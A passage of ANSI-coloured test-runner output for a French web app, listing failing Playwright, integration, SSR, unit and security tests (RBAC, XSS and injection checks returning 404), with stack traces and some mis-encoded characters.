  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/switch.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('SwitchComponent ÔÇô 
documentation page (couverture totaleÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/switch'[39m
[33m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[16/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/table.test.ts[2m [ 
tests/e2e/ui/table.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/table.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('TableComponent ÔÇô 
documentation page (couverture totale)ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/table'[39m
[33m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[17/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/tabs.test.ts[2m [ 
tests/e2e/ui/tabs.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/tabs.test.ts:[2m6:6[22m[39m
    [90m  4| [39m[90m// is present (with emoji) 
inside that demo section.[39m
    [90m  5| [39m
    [90m  6| [39mtest[33m.[39m[34mdescribe[39m(
[32m'TabsComponent ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  
test[33m.[39m[34mbeforeEach[39m(({ isMobile }) 
[33m=>[39m {
    [90m  8| [39m    
test[33m.[39m[34mskip[39m(isMobile[33m,[39m 
[32m'demo text duplicates on mobile'[39m)[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[18/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/tooltip.test.ts[2m [ 
tests/e2e/ui/tooltip.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/tooltip.test.ts:[2m6:6[22m[39m
    [90m  4| [39m[90m// and badge/button 
combinations to assert the examples rendered.[39m
    [90m  5| [39m
    [90m  6| [39mtest[33m.[39m[34mdescribe[39m(
[32m'TooltipComponent ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  
test[33m.[39m[34mbeforeEach[39m(({ isMobile }) 
[33m=>[39m {
    [90m  8| [39m    
test[33m.[39m[34mskip[39m(isMobile[33m,[39m 
[32m'not necessary on mobile'[39m)[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[19/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/video.test.ts[2m [ 
tests/e2e/ui/video.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/video.test.ts:[2m5:6[22m[39m
    [90m  3| [39m// Video page simply embeds a 
<video> element; check its presence and ÔÇª
    [90m  4| [39m
    [90m  5| [39mtest[33m.[39m[34mdescribe[39m(
[32m'VideoComponent ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  6| [39m  
test[33m.[39m[34mbeforeEach[39m(({ isMobile }) 
[33m=>[39m {
    [90m  7| [39m    
test[33m.[39m[34mskip[39m(isMobile[33m,[39m 
[32m'player differences on mobile'[39m)[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[20/38]ÔÄ»[22m[39m


[31mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[39m[1m[41m Failed Tests 18 
[49m[22m[31mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[39m

[41m[1m FAIL [22m[49m 
tests/integration/auth-emails.test.ts[2m > 
[22mBetterAuth Email Functions[2m > [22mEmail 
Verification[2m > [22mshould log mock SMTP when 
email verification is called
[31m[1mAssertionError[22m: expected undefined to 
be truthy[39m

[32m- Expected:[39m 
true

[31m+ Received:[39m 
undefined

[36m [2mÔØ»[22m tests/integration/auth-emails.test.
ts:[2m49:21[22m[39m
    [90m 47| [39m      // Le log est: '[MOCK SMTP] 
Email verification', { to, url, tokeÔÇª
    [90m 48| [39m      const found = 
consoleSpy.mock.calls.find(call => call[0] === '[MÔÇª
    [90m 49| [39m      [34mexpect[39m(found)[33m.
[39m[34mtoBeTruthy[39m()
    [90m   | [39m                    [31m^[39m
    [90m 50| [39m      [35mconst[39m obj 
[33m=[39m found [33m?[39m found[[34m1[39m] 
[33m:[39m undefined
    [90m 51| [39m      [34mexpect[39m(obj)[33m.[
39m[34mtoMatchObject[39m({

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[21/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/integration/auth-emails.test.ts[2m > 
[22mBetterAuth Email Functions[2m > [22mPassword 
Reset[2m > [22mshould log mock SMTP when password 
reset is called
[31m[1mAssertionError[22m: expected undefined to 
be truthy[39m

[32m- Expected:[39m 
true

[31m+ Received:[39m 
undefined

[36m [2mÔØ»[22m tests/integration/auth-emails.test.
ts:[2m96:21[22m[39m
    [90m 94| [39m      [90m// Le log est: '[MOCK 
SMTP] Password reset', { to, url, token }[39m
    [90m 95| [39m      const found = 
consoleSpy.mock.calls.find(call => call[0] === '[MÔÇª
    [90m 96| [39m      [34mexpect[39m(found)[33m.
[39m[34mtoBeTruthy[39m()
    [90m   | [39m                    [31m^[39m
    [90m 97| [39m      [35mconst[39m obj 
[33m=[39m found [33m?[39m found[[34m1[39m] 
[33m:[39m undefined
    [90m 98| [39m      [34mexpect[39m(obj)[33m.[
39m[34mtoMatchObject[39m({

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[22/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/integration/auth-flow.test.ts[2m > [22mAuth 
ÔÇö critical integration tests[2m > [22msign-in 
returns token for valid credentials
[31m[1mError[22m: Failed query: insert into 
"session" ("id", "expires_at", "token", "created_at", 
"updated_at", "ip_address", "user_agent", "user_id", 
"active_organization_id", "impersonated_by") values 
($1, $2, $3, $4, $5, $6, $7, $8, default, default) 
returning "id", "expires_at", "token", "created_at", 
"updated_at", "ip_address", "user_agent", "user_id", 
"active_organization_id", "impersonated_by"
params: Hk15za7Wc2AArf6OXUN4zb58xwIhVYdf,2026-03-09T14
:58:20.486Z,N92fUN1L9KWpaTYuxIceHlxr9vKxx92l,2026-03-0
2T14:58:20.486Z,2026-03-02T14:58:20.486Z,,,3uRLLisHYAI
oD79kde6WPto2vjqS4yzq[39m
[90m [2mÔØ»[22m NodePgPreparedQuery.queryWithCache 
node_modules/.pnpm/drizzle-orm@0.45.1_@prisma+_adef033
d447e1fca34f3f6403b40317c/node_modules/drizzle-orm/pg-
core/session.js:[2m41:15[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/drizzle-orm@0.45
.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_modu
les/drizzle-orm/node-postgres/session.js:[2m117:22[2
2m[39m
[90m [2mÔØ»[22m withReturning node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m18:45[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m131:12[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/@b
etter-auth+core@1.4.18_@b_e298d21959413fbce6f1495fa56e
1343/node_modules/@better-auth/core/dist/db/adapter/fa
ctory.mjs:[2m414:16[22m[39m
[90m [2mÔØ»[22m createWithHooks node_modules/.pnpm/
better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed36
6efea4/node_modules/better-auth/dist/db/with-hooks.mjs
:[2m21:69[22m[39m
[90m [2mÔØ»[22m Object.createSession node_modules/.
pnpm/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38a
aed366efea4/node_modules/better-auth/dist/db/internal-
adapter.mjs:[2m149:11[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/better-auth@1.4.
18_@prisma+_69d76cae5fd43a943b38aaed366efea4/node_modu
les/better-auth/dist/api/routes/sign-in.mjs:[2m237:18
[22m[39m
[90m [2mÔØ»[22m internalHandler node_modules/.pnpm/
better-call@1.1.8_zod@4.3.6/node_modules/better-call/d
ist/endpoint.mjs:[2m30:20[22m[39m

[31m[1mCaused by: error[22m: une instruction 
insert ou update sur la table ┬½ session ┬╗ viole la 
contrainte de cl├®
├®trang├¿re ┬½ session_user_id_user_id_fk ┬╗[39m
[90m [2mÔØ»[22m node_modules/.pnpm/pg@8.18.0/node_m
odules/pg/lib/client.js:[2m624:17[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/drizzle-orm@0.45
.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_modu
les/drizzle-orm/node-postgres/session.js:[2m124:18[2
2m[39m
[90m [2mÔØ»[22m NodePgPreparedQuery.queryWithCache 
node_modules/.pnpm/drizzle-orm@0.45.1_@prisma+_adef033
d447e1fca34f3f6403b40317c/node_modules/drizzle-orm/pg-
core/session.js:[2m39:16[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/drizzle-orm@0.45
.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_modu
les/drizzle-orm/node-postgres/session.js:[2m117:22[2
2m[39m
[90m [2mÔØ»[22m withReturning node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m18:45[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m131:12[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/@b
etter-auth+core@1.4.18_@b_e298d21959413fbce6f1495fa56e
1343/node_modules/@better-auth/core/dist/db/adapter/fa
ctory.mjs:[2m414:16[22m[39m
[90m [2mÔØ»[22m createWithHooks node_modules/.pnpm/
better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed36
6efea4/node_modules/better-auth/dist/db/with-hooks.mjs
:[2m21:69[22m[39m
[90m [2mÔØ»[22m Object.createSession node_modules/.
pnpm/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38a
aed366efea4/node_modules/better-auth/dist/db/internal-
adapter.mjs:[2m149:11[22m[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[22m[39
m
[31m[1mSerialized Error:[22m[39m [90m{ length: 
347, severity: 'ERREUR', code: '23503', detail: 'La 
cl├® (user_id)=(3uRLLisHYAIoD79kde6WPto2vjqS4yzq) 
n\'est pas pr├®sente dans la table ┬½ user ┬╗.', 
hint: undefined, position: undefined, 
internalPosition: undefined, internalQuery: 
undefined, where: undefined, schema: 'public', table: 
'session', dataType: undefined, constraint: 
'session_user_id_user_id_fk', file: 'ri_triggers.c', 
routine: 'ri_ReportViolation' }[39m
[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[23/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > 
[22mRBAC/ABAC[2m > [22mrefuse acc├¿s admin sans 
r├┤le
[31m[1mAssertionError[22m: expected 404 to be 403 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 403[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m12:24[22m[39m
    [90m 10| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 11| [39m    [35mconst[39m res 
[33m=[39m [35mawait[39m 
[34mapiCall[39m([32m'GET'[39m[33m,[39m 
[32m'/admin'[39m[33m,[39m undefined[33m,[39m { 
token })[33m;[39m
    [90m 12| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m403[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 13| [39m    [34mexpect[39m(res[33m.[39m
data[33m.[39mmessage)[33m.[39m[34mtoMatch[39m([
36m/permission/i[39m)[33m;[39m
    [90m 14| [39m  })[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[24/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > 
[22mRBAC/ABAC[2m > [22mautorise acc├¿s admin avec 
r├┤le
[31m[1mAssertionError[22m: expected 404 to be 200 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 200[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m20:24[22m[39m
    [90m 18| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 19| [39m    [35mconst[39m res 
[33m=[39m [35mawait[39m 
[34mapiCall[39m([32m'GET'[39m[33m,[39m 
[32m'/admin'[39m[33m,[39m undefined[33m,[39m { 
token })[33m;[39m
    [90m 20| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m200[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 21| [39m  })[33m;[39m
    [90m 22| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[25/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > 
[22mRBAC/ABAC[2m > [22mrefuse escalade de 
privil├¿ge
[31m[1mAssertionError[22m: expected 404 to be 403 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 403[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m27:24[22m[39m
    [90m 25| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 26| [39m    const res = await 
apiCall('POST', '/admin/escalade', undefined, { ÔÇª
    [90m 27| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m403[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 28| [39m  })[33m;[39m
    [90m 29| [39m})[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[26/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > [22mXSS[2m > 
[22mrejette payload XSS dans formulaire
[31m[1mAssertionError[22m: expected 404 to be 400 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 400[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m37:24[22m[39m
    [90m 35| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 36| [39m    const res = await 
apiCall('POST', '/comments', { content: securityÔÇª
    [90m 37| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m400[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 38| [39m    [34mexpect[39m(res[33m.[39m
data[33m.[39mmessage)[33m.[39m[34mtoMatch[39m([
36m/invalid/i[39m)[33m;[39m
    [90m 39| [39m  })[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[27/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > 
[22mInjection[2m > [22mrejette payload SQLi
[31m[1mAssertionError[22m: expected 404 to be 400 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 400[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m48:24[22m[39m
    [90m 46| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 47| [39m    const res = await 
apiCall('POST', '/comments', { content: securityÔÇª
    [90m 48| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m400[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 49| [39m  })[33m;[39m
    [90m 50| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[28/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > 
[22mInjection[2m > [22mrejette payload NoSQLi
[31m[1mAssertionError[22m: expected 404 to be 400 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 400[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m55:24[22m[39m
    [90m 53| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 54| [39m    const res = await 
apiCall('POST', '/comments', { content: securityÔÇª
    [90m 55| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m400[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 56| [39m  })[33m;[39m
    [90m 57| [39m})[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[29/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/security/security.test.ts[2m > 
[22mEscalade[2m > [22mrefuse modification de r├┤le 
sans autorisation
[31m[1mAssertionError[22m: expected 404 to be 403 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 403[39m
[31m+ 404[39m

[36m [2mÔØ»[22m 
tests/security/security.test.ts:[2m65:24[22m[39m
    [90m 63| [39m    const { token } = await 
loginTestUser(user.credentials.email, userÔÇª
    [90m 64| [39m    const res = await 
apiCall('POST', '/users/role', { role: 'admin' }ÔÇª
    [90m 65| [39m    [34mexpect[39m(res[33m.[39m
status)[33m.[39m[34mtoBe[39m([34m403[39m)[33m;
[39m
    [90m   | [39m                       [31m^[39m
    [90m 66| [39m  })[33m;[39m
    [90m 67| [39m})[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[30/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/ssr/ssr-hydration-errors.test.ts[2m > [22mSSR 
rendering[2m > [22mrenders homepage for all locales
[31m[1mAssertionError[22m: expected 500 to be 200 
// Object.is equality[39m

[32m- Expected[39m
[31m+ Received[39m

[32m- 200[39m
[31m+ 500[39m

[36m [2mÔØ»[22m tests/ssr/ssr-hydration-errors.test
.ts:[2m12:29[22m[39m
    [90m 10| [39m      [35mconst[39m result 
[33m=[39m [35mawait[39m [34mrenderSSR[39m([32m`
/[39m[36m${[39mlocale[36m}[39m[32m/`[39m)[33m;
[39m
    [90m 11| [39m      [34mexpect[39m(result[33m.
[39mhtml)[33m.[39m[34mtoContain[39m([32m'<html'
[39m)[33m;[39m
    [90m 12| [39m      [34mexpect[39m(result[33m.
[39mstatus)[33m.[39m[34mtoBe[39m([34m200[39m)[
33m;[39m
    [90m   | [39m                            
[31m^[39m
    [90m 13| [39m    }
    [90m 14| [39m  })[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[31/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/unit/theme.test.ts[2m > [22mtheme utility[2m 
> [22mgetTheme prefers stored value over media
[41m[1m FAIL [22m[49m 
tests/unit/theme.test.ts[2m > [22mtheme utility[2m 
> [22mgetTheme falls back to cookie when 
localStorage throws
[41m[1m FAIL [22m[49m 
tests/unit/theme.test.ts[2m > [22mtheme utility[2m 
> [22mgetTheme defaults to prefers-color-scheme when 
nothing stored
[41m[1m FAIL [22m[49m 
tests/unit/theme.test.ts[2m > [22mtheme utility[2m 
> [22msetTheme applies attribute and persists
[41m[1m FAIL [22m[49m 
tests/unit/theme.test.ts[2m > [22mtheme utility[2m 
> [22minitTheme writes initial attribute
[41m[1m FAIL [22m[49m 
tests/unit/theme.test.ts[2m > [22mtheme utility[2m 
> [22mdispatches themechange event when set
[31m[1mReferenceError[22m: document is not 
defined[39m
[36m [2mÔØ»[22m 
tests/unit/theme.test.ts:[2m7:5[22m[39m
    [90m  5| [39m  [34mbeforeEach[39m(() 
[33m=>[39m {
    [90m  6| [39m    [90m// reset cookie and 
localStorage[39m
    [90m  7| [39m    document[33m.[39mcookie 
[33m=[39m [32m''[39m[33m;[39m
    [90m   | [39m    [31m^[39m
    [90m  8| [39m    [35mtry[39m {
    [90m  9| [39m      window[33m.[39mlocalStorage
[33m.[39m[34mclear[39m()[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[32/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
src/lib/auth/auth.test.ts[2m > [22mAuth - Security 
& Functionality[2m > [22mPassword Reset[2m > 
[22mtoken reset expire
[31m[1mError[22m: Failed query: insert into 
"account" ("id", "account_id", "provider_id", 
"user_id", "access_token", "refresh_token", 
"id_token", "access_token_expires_at", 
